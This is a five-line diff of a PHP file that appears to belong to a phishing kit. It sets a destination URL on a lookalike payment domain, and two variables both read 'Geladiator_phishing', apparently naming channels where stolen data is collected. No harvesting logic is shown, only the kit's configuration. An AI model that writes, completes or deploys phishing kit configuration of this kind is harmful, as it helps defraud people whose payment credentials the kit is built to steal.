@@ -1,5 +1,5 @@
 <?php
-
+$url= "https://asanpay.gq/";
 $tel="Geladiator_phishing ";
 
 $chanel="Geladiator_phishing ";
